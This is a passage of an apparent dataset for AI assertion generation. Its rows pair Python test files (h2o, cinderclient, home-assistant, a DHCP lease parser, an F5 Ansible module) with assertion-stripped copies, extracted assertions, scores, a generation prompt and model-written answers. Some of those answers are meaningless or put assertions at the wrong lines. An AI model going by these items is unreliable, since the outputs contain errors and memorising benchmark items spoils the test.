99            (10, 2, 'cA', 120),
100            (10, 2, 'cG', 120),
101            (10, 2, 'cH', 120),
102            ]
103
104        print ""What about messages to log (INFO) about unmatched quotes (before eol)""
105        # got this ..trying to avoid for now
106        # Exception: rjson error in parse: Argument 'source_key' error: Parser setup appears to be broken, got AUTO
107
108        for (rowCount, colCount, hex_key, timeoutSecs) in tryList:
109            SEEDPERFILE = random.randint(0, sys.maxint)
110            csvFilename = 'syn_' + str(SEEDPERFILE) + ""_"" + str(rowCount) + 'x' + str(colCount) + '.csv'
111            csvPathname = SYNDATASETS_DIR + '/' + csvFilename
112
113            print ""\nCreating random"", csvPathname
114            write_syn_dataset(csvPathname, rowCount, colCount, SEED=SEEDPERFILE)
115            parseResult = h2i.import_parse(path=csvPathname, schema='put', check_header=0,
116                hex_key=hex_key, timeoutSecs=timeoutSecs, doSummary=False)
117            print ""parseResult:"", dump_json(parseResult)
118
119            numRows, numCols, parse_key = h2o_cmd.infoFromParse(parseResult)
120            inspect = h2o_cmd.runInspect(key=parse_key)
121            missingList, labelList, numRows, numCols = h2o_cmd.infoFromInspect(inspect)
122
123            # FIX! check type?
124        
125            # print ""inspect:"", h2o.dump_json(inspect)
126
127if __name__ == '__main__':
128    h2o.unit_main()
129",7348,"[[53, 'length', '>=', 1, 'length should be greater or equal to 1 for correct string generation'],
 [53, 'row', '>=', 0, 'row index should be non-negative'],
 [53, 'col', '>=', 0, 'column index should be non-negative'],
 [68, 'rowCount', '>=', 1, 'there must be at least one row to write the dataset'],
 [68, 'colCount', '>=', 1, 'there must be at least one column to write the dataset'],
 [68, 'SEED', '>=', 0, 'seed must be non-negative for random generation'],
 [108, 'rowCount', '>=', 1, 'there must be at least one row to create the dataset'],
 [108, 'colCount', '>=', 1, 'there must be at least one column to create the dataset'],
 [108, 'timeoutSecs', '>=', 0, 'timeout cannot be a negative value'],
 [119, 'numRows', '==', 'rowCount', ""Number of rows in the parsed result should match the dataset's row count""],
 [119, 'numCols', '==', 'colCount', ""Number of columns in the parsed result should match the dataset's column count""]]"
JioCloud/python-cinderclient,"# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import json

from cinderclient.tests.fixture_data import base


def _stub_snapshot(**kwargs):
    snapshot = {
        ""created_at"": ""2012-08-28T16:30:31.000000"",
        ""display_description"": None,
        ""display_name"": None,
        ""id"": '11111111-1111-1111-1111-111111111111',
        ""size"": 1,
        ""status"": ""available"",
        ""volume_id"": '00000000-0000-0000-0000-000000000000',
    }
    snapshot.update(kwargs)
    return snapshot


class Fixture(base.Fixture):

    base_url = 'snapshots'

    def setUp(self):
        super(Fixture, self).setUp()

        snapshot_1234 = _stub_snapshot(id='1234')
        self.requests.register_uri('GET', self.url('1234'),
                                   json={'snapshot': snapshot_1234})

        def action_1234(request, context):
            return ''
            body = json.loads(request.body.decode('utf-8'))
            assert len(list(body)) == 1
            action = list(body)[0]
            if action == 'os-reset_status':
                assert 'status' in body['os-reset_status']
            elif action == 'os-update_snapshot_status':
                assert 'status' in body['os-update_snapshot_status']
            else:
                raise AssertionError(""Unexpected action: %s"" % action)
            return ''
        self.requests.register_uri('POST', self.url('1234', 'action'),
                                   text=action_1234, status_code=202)
","
1# Licensed under the Apache License, Version 2.0 (the ""License""); you may
2# not use this file except in compliance with the License. You may obtain
3# a copy of the License at
4#
5#      http://www.apache.org/licenses/LICENSE-2.0
6#
7# Unless required by applicable law or agreed to in writing, software
8# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
9# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
10# License for the specific language governing permissions and limitations
11# under the License.
12
13import json
14
15from cinderclient.tests.fixture_data import base
16
17
18def _stub_snapshot(**kwargs):
19    snapshot = {
20        ""created_at"": ""2012-08-28T16:30:31.000000"",
21        ""display_description"": None,
22        ""display_name"": None,
23        ""id"": '11111111-1111-1111-1111-111111111111',
24        ""size"": 1,
25        ""status"": ""available"",
26        ""volume_id"": '00000000-0000-0000-0000-000000000000',
27    }
28    snapshot.update(kwargs)
29    return snapshot
30
31
32class Fixture(base.Fixture):
33
34    base_url = 'snapshots'
35
36    def setUp(self):
37        super(Fixture, self).setUp()
38
39        snapshot_1234 = _stub_snapshot(id='1234')
40        self.requests.register_uri('GET', self.url('1234'),
41                                   json={'snapshot': snapshot_1234})
42
43        def action_1234(request, context):
44            return ''
45            body = json.loads(request.body.decode('utf-8'))
46            action = list(body)[0]
47            if action == 'os-reset_status':
48            elif action == 'os-update_snapshot_status':
49            else:
50                raise AssertionError(""Unexpected action: %s"" % action)
51            return ''
52        self.requests.register_uri('POST', self.url('1234', 'action'),
53                                   text=action_1234, status_code=202)
54","[['len(list(body))', '==', '1']]",3,1,0.3333333333333333,0.0005065856129685,"['**kwargs', 'snapshot', 'base_url', 'snapshot_1234', 'request', 'context', 'body', 'action']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['**kwargs', 'snapshot', 'base_url', 'snapshot_1234', 'request', 'context', 'body', 'action']
*Code:

1# Licensed under the Apache License, Version 2.0 (the ""License""); you may
2# not use this file except in compliance with the License. You may obtain
3# a copy of the License at
4#
5#      http://www.apache.org/licenses/LICENSE-2.0
6#
7# Unless required by applicable law or agreed to in writing, software
8# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
9# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
10# License for the specific language governing permissions and limitations
11# under the License.
12
13import json
14
15from cinderclient.tests.fixture_data import base
16
17
18def _stub_snapshot(**kwargs):
19    snapshot = {
20        ""created_at"": ""2012-08-28T16:30:31.000000"",
21        ""display_description"": None,
22        ""display_name"": None,
23        ""id"": '11111111-1111-1111-1111-111111111111',
24        ""size"": 1,
25        ""status"": ""available"",
26        ""volume_id"": '00000000-0000-0000-0000-000000000000',
27    }
28    snapshot.update(kwargs)
29    return snapshot
30
31
32class Fixture(base.Fixture):
33
34    base_url = 'snapshots'
35
36    def setUp(self):
37        super(Fixture, self).setUp()
38
39        snapshot_1234 = _stub_snapshot(id='1234')
40        self.requests.register_uri('GET', self.url('1234'),
41                                   json={'snapshot': snapshot_1234})
42
43        def action_1234(request, context):
44            return ''
45            body = json.loads(request.body.decode('utf-8'))
46            action = list(body)[0]
47            if action == 'os-reset_status':
48            elif action == 'os-update_snapshot_status':
49            else:
50                raise AssertionError(""Unexpected action: %s"" % action)
51            return ''
52        self.requests.register_uri('POST', self.url('1234', 'action'),
53                                   text=action_1234, status_code=202)
54",3379,"[[18, '**kwargs', '!=', None, ""kwargs should not be null to be able to update snapshot""],
 [39, 'snapshot_1234', '!=', None, ""snapshot_1234 should not be null to register uri""],
 [43, 'context', '!=', None, ""context should not be null to execute action_1234""],
 [43, 'request', '!=', None, ""request should not be null to execute action_1234""],
 [45, 'body', '!=', None, ""body should not be null to form a action""],
 [46, 'action', '!=', None, ""action should not be null to complete a request""]]"
aequitas/home-assistant,"""""""Test aiohttp request helper.""""""

from homeassistant.util import aiohttp


async def test_request_json():
    """"""Test a JSON request.""""""
    request = aiohttp.MockRequest(b'{""hello"": 2}')
    assert request.status == 200
    assert await request.json() == {
        'hello': 2
    }


async def test_request_text():
    """"""Test a JSON request.""""""
    request = aiohttp.MockRequest(b'hello', status=201)
    assert request.status == 201
    assert await request.text() == 'hello'


async def test_request_post_query():
    """"""Test a JSON request.""""""
    request = aiohttp.MockRequest(
        b'hello=2&post=true', query_string='get=true', method='POST')
    assert request.method == 'POST'
    assert await request.post() == {
        'hello': '2',
        'post': 'true'
    }
    assert request.query == {
        'get': 'true'
    }
","
1""""""Test aiohttp request helper.""""""
2
3from homeassistant.util import aiohttp
4
5
6async def test_request_json():
7    """"""Test a JSON request.""""""
8    request = aiohttp.MockRequest(b'{""hello"": 2}')
9        'hello': 2
10    }
11
12
13async def test_request_text():
14    """"""Test a JSON request.""""""
15    request = aiohttp.MockRequest(b'hello', status=201)
16
17
18async def test_request_post_query():
19    """"""Test a JSON request.""""""
20    request = aiohttp.MockRequest(
21        b'hello=2&post=true', query_string='get=true', method='POST')
22        'hello': '2',
23        'post': 'true'
24    }
25        'get': 'true'
26    }
27","[['request.status', '==', '200'], ['await request.json()', '==', '{'], ['request.status', '==', '201'], ['await request.text()', '==', ""'hello'""], ['request.method', '==', ""'POST'""], ['await request.post()', '==', '{'], ['request.query', '==', '{']]",7,7,1.0,0.0083532219570405,['request'],1,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['request']
*Code:

1""""""Test aiohttp request helper.""""""
2
3from homeassistant.util import aiohttp
4
5
6async def test_request_json():
7    """"""Test a JSON request.""""""
8    request = aiohttp.MockRequest(b'{""hello"": 2}')
9        'hello': 2
10    }
11
12
13async def test_request_text():
14    """"""Test a JSON request.""""""
15    request = aiohttp.MockRequest(b'hello', status=201)
16
17
18async def test_request_post_query():
19    """"""Test a JSON request.""""""
20    request = aiohttp.MockRequest(
21        b'hello=2&post=true', query_string='get=true', method='POST')
22        'hello': '2',
23        'post': 'true'
24    }
25        'get': 'true'
26    }
27",2026,"[[7, 'request', '!=', None, ""Request can't be None""], [14, 'request', '!=', None, ""Request can't be None""], [20, 'request', '!=', None, ""Request can't be None""]]"
ceph/propernoun,"import pytest

from .. import parser


def test_deleted():
    s = """"""\
lease 1.2.3.4 {
  deleted;
}
""""""
    g = parser.parse(s)
    lease = next(g)
    assert lease == dict(ip='1.2.3.4', deleted=True)
    with pytest.raises(StopIteration):
        next(g)


def test_partial():
    s = """"""\
lease 1.2.3.4 {
  deleted;
}
lease 1.2
""""""
    g = parser.parse(s)
    lease = next(g)
    assert lease == dict(ip='1.2.3.4', deleted=True)
    with pytest.raises(StopIteration):
        next(g)


def test_two():
    s = """"""\
lease 1.2.3.4 {
  deleted;
}
lease 2.3.4.5 {
  deleted;
}
""""""
    g = parser.parse(s)
    lease = next(g)
    assert lease == dict(ip='1.2.3.4', deleted=True)
    lease = next(g)
    assert lease == dict(ip='2.3.4.5', deleted=True)
    with pytest.raises(StopIteration):
        next(g)


def test_comment():
    s = """"""\
# foo
""""""
    g = parser.parse(s)
    with pytest.raises(StopIteration):
        next(g)


def test_junk():
    s = """"""\
lease 10.13.42.20 {
  foo bar;
}
""""""
    g = parser.parse(s)
    lease = next(g)
    assert lease == dict(
        ip='10.13.42.20',
        )
    with pytest.raises(StopIteration):
        next(g)


def test_mac():
    s = """"""\
lease 10.13.42.20 {
  hardware ethernet 52:54:00:de:ad:11;
}
""""""
    g = parser.parse(s)
    lease = next(g)
    assert lease == dict(
        ip='10.13.42.20',
        mac='52:54:00:de:ad:11',
        )
    with pytest.raises(StopIteration):
        next(g)


def test_single():
    s = """"""\
lease 10.13.42.20 {
  starts 4 2012/06/21 18:42:57;
  ends 4 2012/06/21 18:52:57;
  cltt 4 2012/06/21 18:42:57;
  binding state active;
  next binding state free;
  hardware ethernet 52:54:00:de:ad:11;
  client-hostname ""dhcptest01"";
}
""""""
    g = parser.parse(s)
    lease = next(g)
    assert lease == dict(
        ip='10.13.42.20',
        mac='52:54:00:de:ad:11',
        )
    with pytest.raises(StopIteration):
        next(g)


def test_realistic():
    s = """"""\
# The format of this file is documented in the dhcpd.leases(5) manual page.
# This lease file was written by isc-dhcp-4.1-ESV-R4

lease 10.13.42.20 {
  starts 4 2012/06/21 18:34:10;
  ends 4 2012/06/21 18:44:10;
  cltt 4 2012/06/21 18:34:10;
  binding state active;
  next binding state free;
  hardware ethernet 52:54:00:de:ad:11;
  client-hostname ""dhcptest01"";
}
server-duid ""\000\001\000\001\027u\016\024RT\000H\227W"";

lease 10.13.42.20 {
  starts 4 2012/06/21 18:42:57;
  ends 4 2012/06/21 18:52:57;
  cltt 4 2012/06/21 18:42:57;
  binding state active;
  next binding state free;
  hardware ethernet 52:54:00:de:ad:11;
  client-hostname ""dhcptest01"";
}
lease 10.13.42.20 {
  starts 4 2012/06/21 18:52:01;
  ends 4 2012/06/21 19:02:01;
  cltt 4 2012/06/21 18:52:01;
  binding state active;
  next binding state free;
  hardware ethernet 52:54:00:de:ad:11;
  client-hostname ""dhcptest01"";
}
lease 10.1.2.3 {
  starts 4 2012/06/21 18:53:35;
  ends 4 2012/06/21 19:03:35;
  cltt 4 2012/06/21 18:53:35;
  binding state active;
  next binding state free;
  hardware ethernet 52:54:00:f0:0b:a5;
  client-hostname ""dhcptest02"";
}
lease 10.13.42.20 {
  starts 4 2012/06/21 19:00:47;
  ends 4 2012/06/21 19:10:47;
  cltt 4 2012/06/21 19:00:47;
  binding state active;
  next binding state free;
  hardware ethernet 52:54:00:de:ad:11;
  client-hostname ""dhcptest01"";
}
""""""
    g = parser.parse(s)
    lease = next(g)
    assert lease == dict(ip='10.13.42.20', mac='52:54:00:de:ad:11')
    lease = next(g)
    assert lease == dict(ip='10.13.42.20', mac='52:54:00:de:ad:11')
    lease = next(g)
    assert lease == dict(ip='10.13.42.20', mac='52:54:00:de:ad:11')
    lease = next(g)
    assert lease == dict(ip='10.1.2.3', mac='52:54:00:f0:0b:a5')
    lease = next(g)
    assert lease == dict(ip='10.13.42.20', mac='52:54:00:de:ad:11')
    with pytest.raises(StopIteration):
        next(g)
","
1import pytest
2
3from .. import parser
4
5
6def test_deleted():
7    s = """"""\
8lease 1.2.3.4 {
9  deleted;
10}
11""""""
12    g = parser.parse(s)
13    lease = next(g)
14    with pytest.raises(StopIteration):
15        next(g)
16
17
18def test_partial():
19    s = """"""\
20lease 1.2.3.4 {
21  deleted;
22}
23lease 1.2
24""""""
25    g = parser.parse(s)
26    lease = next(g)
27    with pytest.raises(StopIteration):
28        next(g)
29
30
31def test_two():
32    s = """"""\
33lease 1.2.3.4 {
34  deleted;
35}
36lease 2.3.4.5 {
37  deleted;
38}
39""""""
40    g = parser.parse(s)
41    lease = next(g)
42    lease = next(g)
43    with pytest.raises(StopIteration):
44        next(g)
45
46
47def test_comment():
48    s = """"""\
49# foo
50""""""
51    g = parser.parse(s)
52    with pytest.raises(StopIteration):
53        next(g)
54
55
56def test_junk():
57    s = """"""\
58lease 10.13.42.20 {
59  foo bar;
60}
61""""""
62    g = parser.parse(s)
63    lease = next(g)
64        ip='10.13.42.20',
65        )
66    with pytest.raises(StopIteration):
67        next(g)
68
69
70def test_mac():
71    s = """"""\
72lease 10.13.42.20 {
73  hardware ethernet 52:54:00:de:ad:11;
74}
75""""""
76    g = parser.parse(s)
77    lease = next(g)
78        ip='10.13.42.20',
79        mac='52:54:00:de:ad:11',
80        )
81    with pytest.raises(StopIteration):
82        next(g)
83
84
85def test_single():
86    s = """"""\
87lease 10.13.42.20 {
88  starts 4 2012/06/21 18:42:57;
89  ends 4 2012/06/21 18:52:57;
90  cltt 4 2012/06/21 18:42:57;
91  binding state active;
92  next binding state free;
93  hardware ethernet 52:54:00:de:ad:11;
94  client-hostname ""dhcptest01"";
95}
96""""""
97    g = parser.parse(s)
98    lease = next(g)
99        ip='10.13.42.20',
100        mac='52:54:00:de:ad:11',
101        )
102    with pytest.raises(StopIteration):
103        next(g)
104
105
106def test_realistic():
107    s = """"""\
108# The format of this file is documented in the dhcpd.leases(5) manual page.
109# This lease file was written by isc-dhcp-4.1-ESV-R4
110
111lease 10.13.42.20 {
112  starts 4 2012/06/21 18:34:10;
113  ends 4 2012/06/21 18:44:10;
114  cltt 4 2012/06/21 18:34:10;
115  binding state active;
116  next binding state free;
117  hardware ethernet 52:54:00:de:ad:11;
118  client-hostname ""dhcptest01"";
119}
120server-duid ""\000\001\000\001\027u\016\024RT\000H\227W"";
121
122lease 10.13.42.20 {
123  starts 4 2012/06/21 18:42:57;
124  ends 4 2012/06/21 18:52:57;
125  cltt 4 2012/06/21 18:42:57;
126  binding state active;
127  next binding state free;
128  hardware ethernet 52:54:00:de:ad:11;
129  client-hostname ""dhcptest01"";
130}
131lease 10.13.42.20 {
132  starts 4 2012/06/21 18:52:01;
133  ends 4 2012/06/21 19:02:01;
134  cltt 4 2012/06/21 18:52:01;
135  binding state active;
136  next binding state free;
137  hardware ethernet 52:54:00:de:ad:11;
138  client-hostname ""dhcptest01"";
139}
140lease 10.1.2.3 {
141  starts 4 2012/06/21 18:53:35;
142  ends 4 2012/06/21 19:03:35;
143  cltt 4 2012/06/21 18:53:35;
144  binding state active;
145  next binding state free;
146  hardware ethernet 52:54:00:f0:0b:a5;
147  client-hostname ""dhcptest02"";
148}
149lease 10.13.42.20 {
150  starts 4 2012/06/21 19:00:47;
151  ends 4 2012/06/21 19:10:47;
152  cltt 4 2012/06/21 19:00:47;
153  binding state active;
154  next binding state free;
155  hardware ethernet 52:54:00:de:ad:11;
156  client-hostname ""dhcptest01"";
157}
158""""""
159    g = parser.parse(s)
160    lease = next(g)
161    lease = next(g)
162    lease = next(g)
163    lease = next(g)
164    lease = next(g)
165    with pytest.raises(StopIteration):
166        next(g)
167","[['lease', '==', ""dict(ip='1.2.3.4'""], ['lease', '==', ""dict(ip='1.2.3.4'""], ['lease', '==', ""dict(ip='1.2.3.4'""], ['lease', '==', ""dict(ip='2.3.4.5'""], ['lease', '==', 'dict('], ['lease', '==', 'dict('], ['lease', '==', 'dict('], ['lease', '==', ""dict(ip='10.13.42.20'""], ['lease', '==', ""dict(ip='10.13.42.20'""], ['lease', '==', ""dict(ip='10.13.42.20'""], ['lease', '==', ""dict(ip='10.1.2.3'""], ['lease', '==', ""dict(ip='10.13.42.20'""]]",12,12,1.0,0.0031258140140661,"['s', 'g', 'lease']",3,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['s', 'g', 'lease']
*Code:

1import pytest
2
3from .. import parser
4
5
6def test_deleted():
7    s = """"""\
8lease 1.2.3.4 {
9  deleted;
10}
11""""""
12    g = parser.parse(s)
13    lease = next(g)
14    with pytest.raises(StopIteration):
15        next(g)
16
17
18def test_partial():
19    s = """"""\
20lease 1.2.3.4 {
21  deleted;
22}
23lease 1.2
24""""""
25    g = parser.parse(s)
26    lease = next(g)
27    with pytest.raises(StopIteration):
28        next(g)
29
30
31def test_two():
32    s = """"""\
33lease 1.2.3.4 {
34  deleted;
35}
36lease 2.3.4.5 {
37  deleted;
38}
39""""""
40    g = parser.parse(s)
41    lease = next(g)
42    lease = next(g)
43    with pytest.raises(StopIteration):
44        next(g)
45
46
47def test_comment():
48    s = """"""\
49# foo
50""""""
51    g = parser.parse(s)
52    with pytest.raises(StopIteration):
53        next(g)
54
55
56def test_junk():
57    s = """"""\
58lease 10.13.42.20 {
59  foo bar;
60}
61""""""
62    g = parser.parse(s)
63    lease = next(g)
64        ip='10.13.42.20',
65        )
66    with pytest.raises(StopIteration):
67        next(g)
68
69
70def test_mac():
71    s = """"""\
72lease 10.13.42.20 {
73  hardware ethernet 52:54:00:de:ad:11;
74}
75""""""
76    g = parser.parse(s)
77    lease = next(g)
78        ip='10.13.42.20',
79        mac='52:54:00:de:ad:11',
80        )
81    with pytest.raises(StopIteration):
82        next(g)
83
84
85def test_single():
86    s = """"""\
87lease 10.13.42.20 {
88  starts 4 2012/06/21 18:42:57;
89  ends 4 2012/06/21 18:52:57;
90  cltt 4 2012/06/21 18:42:57;
91  binding state active;
92  next binding state free;
93  hardware ethernet 52:54:00:de:ad:11;
94  client-hostname ""dhcptest01"";
95}
96""""""
97    g = parser.parse(s)
98    lease = next(g)
99        ip='10.13.42.20',
100        mac='52:54:00:de:ad:11',
101        )
102    with pytest.raises(StopIteration):
103        next(g)
104
105
106def test_realistic():
107    s = """"""\
108# The format of this file is documented in the dhcpd.leases(5) manual page.
109# This lease file was written by isc-dhcp-4.1-ESV-R4
110
111lease 10.13.42.20 {
112  starts 4 2012/06/21 18:34:10;
113  ends 4 2012/06/21 18:44:10;
114  cltt 4 2012/06/21 18:34:10;
115  binding state active;
116  next binding state free;
117  hardware ethernet 52:54:00:de:ad:11;
118  client-hostname ""dhcptest01"";
119}
120server-duid ""\000\001\000\001\027u\016\024RT\000H\227W"";
121
122lease 10.13.42.20 {
123  starts 4 2012/06/21 18:42:57;
124  ends 4 2012/06/21 18:52:57;
125  cltt 4 2012/06/21 18:42:57;
126  binding state active;
127  next binding state free;
128  hardware ethernet 52:54:00:de:ad:11;
129  client-hostname ""dhcptest01"";
130}
131lease 10.13.42.20 {
132  starts 4 2012/06/21 18:52:01;
133  ends 4 2012/06/21 19:02:01;
134  cltt 4 2012/06/21 18:52:01;
135  binding state active;
136  next binding state free;
137  hardware ethernet 52:54:00:de:ad:11;
138  client-hostname ""dhcptest01"";
139}
140lease 10.1.2.3 {
141  starts 4 2012/06/21 18:53:35;
142  ends 4 2012/06/21 19:03:35;
143  cltt 4 2012/06/21 18:53:35;
144  binding state active;
145  next binding state free;
146  hardware ethernet 52:54:00:f0:0b:a5;
147  client-hostname ""dhcptest02"";
148}
149lease 10.13.42.20 {
150  starts 4 2012/06/21 19:00:47;
151  ends 4 2012/06/21 19:10:47;
152  cltt 4 2012/06/21 19:00:47;
153  binding state active;
154  next binding state free;
155  hardware ethernet 52:54:00:de:ad:11;
156  client-hostname ""dhcptest01"";
157}
158""""""
159    g = parser.parse(s)
160    lease = next(g)
161    lease = next(g)
162    lease = next(g)
163    lease = next(g)
164    lease = next(g)
165    with pytest.raises(StopIteration):
166        next(g)
167",5005,"[6, 's', '!=', '', 's should not be an empty string'],
[18, 's', '!=', '', 's should not be an empty string'],
[31, 's', '!=', '', 's should not be an empty string'],
[47, 's', '!=', '', 's should not be an empty string'],
[56, 's', '!=', '', 's should not be an empty string'],
[70, 's', '!=', '', 's should not be an empty string'],
[85, 's', '!=', '', 's should not be an empty string'],
[106, 's', '!=', '', 's should not be an empty string'],
[12, 'g', '!=', None, 'g should not be None after parsing'],
[26, 'g', '!=', None, 'g should not be None after parsing'],
[41, 'g', '!=', None, 'g should not be None after parsing'],
[51, 'g', '!=', None, 'g should not be None after parsing'],
[62, 'g', '!=', None, 'g should not be None after parsing'],
[77, 'g', '!=', None, 'g should not be None after parsing'],
[97, 'g', '!=', None, 'g should not be None after parsing'],
[160, 'g', '!=', None, 'g should not be None after parsing'],
[13, 'lease', '!=', None, 'lease should not be None after parsing'],
[27, 'lease', '!=', None, 'lease should not be None after parsing'],
[42, 'lease', '!=', None, 'lease should not be None after parsing'],
[63, 'lease', '!=', None, 'lease should not be None after parsing'],
[78, 'lease', '!=', None, 'lease should not be None after parsing'],
[98, 'lease', '!=', None, 'lease should not be None after parsing'],
[161, 'lease', '!=', None, 'lease should not be None after parsing']"
helldorado/ansible,"# -*- coding: utf-8 -*-
#
# Copyright: (c) 2017, F5 Networks Inc.
# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

import os
import json
import pytest
import sys

if sys.version_info < (2, 7):
    pytestmark = pytest.mark.skip(""F5 Ansible modules require Python >= 2.7"")

from ansible.module_utils.basic import AnsibleModule

try:
    from library.modules.bigip_profile_oneconnect import ApiParameters
    from library.modules.bigip_profile_oneconnect import ModuleParameters
    from library.modules.bigip_profile_oneconnect import ModuleManager
    from library.modules.bigip_profile_oneconnect import ArgumentSpec

    # In Ansible 2.8, Ansible changed import paths.
    from test.units.compat import unittest
    from test.units.compat.mock import Mock
    from test.units.compat.mock import patch

    from test.units.modules.utils import set_module_args
except ImportError:
    from ansible.modules.network.f5.bigip_profile_oneconnect import ApiParameters
    from ansible.modules.network.f5.bigip_profile_oneconnect import ModuleParameters
    from ansible.modules.network.f5.bigip_profile_oneconnect import ModuleManager
    from ansible.modules.network.f5.bigip_profile_oneconnect import ArgumentSpec

    # Ansible 2.8 imports
    from units.compat import unittest
    from units.compat.mock import Mock
    from units.compat.mock import patch

    from units.modules.utils import set_module_args


fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
fixture_data = {}


def load_fixture(name):
    path = os.path.join(fixture_path, name)

    if path in fixture_data:
        return fixture_data[path]

    with open(path) as f:
        data = f.read()

    try:
        data = json.loads(data)
    except Exception:
        pass

    fixture_data[path] = data
    return data


class TestParameters(unittest.TestCase):
    def test_module_parameters(self):
        args = dict(
            name='foo',
            parent='bar',
            maximum_size=100,
            maximum_age=200,
            maximum_reuse=300,
            idle_timeout_override=20,
            limit_type='strict'
        )

        p = ModuleParameters(params=args)
        assert p.name == 'foo'
        assert p.parent == '/Common/bar'
        assert p.maximum_size == 100
        assert p.maximum_age == 200
        assert p.maximum_reuse == 300
        assert p.idle_timeout_override == 20
        assert p.limit_type == 'strict'

    def test_api_parameters(self):
        args = load_fixture('load_ltm_profile_oneconnect_1.json')
        p = ApiParameters(params=args)
        assert p.name == 'oneconnect'
        assert p.maximum_reuse == 1000


class TestManager(unittest.TestCase):

    def setUp(self):
        self.spec = ArgumentSpec()

    def test_create(self, *args):
        # Configure the arguments that would be sent to the Ansible module
        set_module_args(dict(
            name='foo',
            parent='bar',
            maximum_reuse=1000,
            provider=dict(
                server='localhost',
                password='password',
                user='admin'
            )
        ))

        module = AnsibleModule(
            argument_spec=self.spec.argument_spec,
            supports_check_mode=self.spec.supports_check_mode
        )
        mm = ModuleManager(module=module)

        # Override methods to force specific logic in the module to happen
        mm.exists = Mock(return_value=False)
        mm.create_on_device = Mock(return_value=True)

        results = mm.exec_module()

        assert results['changed'] is True
        assert results['maximum_reuse'] == 1000
","
1# -*- coding: utf-8 -*-
2#
3# Copyright: (c) 2017, F5 Networks Inc.
4# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)
5
6from __future__ import (absolute_import, division, print_function)
7__metaclass__ = type
8
9import os
10import json
11import pytest
12import sys
13
14if sys.version_info < (2, 7):
15    pytestmark = pytest.mark.skip(""F5 Ansible modules require Python >= 2.7"")
16
17from ansible.module_utils.basic import AnsibleModule
18
19try:
20    from library.modules.bigip_profile_oneconnect import ApiParameters
21    from library.modules.bigip_profile_oneconnect import ModuleParameters
22    from library.modules.bigip_profile_oneconnect import ModuleManager
23    from library.modules.bigip_profile_oneconnect import ArgumentSpec
24
25    # In Ansible 2.8, Ansible changed import paths.
26    from test.units.compat import unittest
27    from test.units.compat.mock import Mock
28    from test.units.compat.mock import patch
29
30    from test.units.modules.utils import set_module_args
31except ImportError:
32    from ansible.modules.network.f5.bigip_profile_oneconnect import ApiParameters
33    from ansible.modules.network.f5.bigip_profile_oneconnect import ModuleParameters
34    from ansible.modules.network.f5.bigip_profile_oneconnect import ModuleManager
35    from ansible.modules.network.f5.bigip_profile_oneconnect import ArgumentSpec
36
37    # Ansible 2.8 imports
38    from units.compat import unittest
39    from units.compat.mock import Mock
40    from units.compat.mock import patch
41
42    from units.modules.utils import set_module_args
43
44
